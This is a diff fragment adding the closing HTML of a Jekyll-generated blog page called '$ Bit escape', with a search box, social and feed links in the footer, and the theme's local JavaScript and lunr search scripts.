+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+          <li><a href="https://github.com/aandersonl" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://br.linkedin.com/in/anderson-leite-6886b117a" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2020 $ Bit escape. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
